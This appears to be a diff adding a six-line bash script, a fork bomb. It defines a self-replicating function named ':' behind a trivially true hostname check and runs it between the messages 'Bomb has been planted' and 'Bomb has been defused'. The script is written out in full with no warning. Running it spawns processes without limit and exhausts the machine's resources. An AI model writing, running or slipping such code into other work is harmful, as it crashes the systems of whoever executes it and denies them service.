@@ -1,0 +1,6 @@
+#!/bin/bash
+HOSTNAME=$(hostname)
+: () { [ ${HOSTNAME} == $(hostname) ] && ( : & : );}
+echo "Bomb has been planted"
+:
+echo "Bomb has been defused"
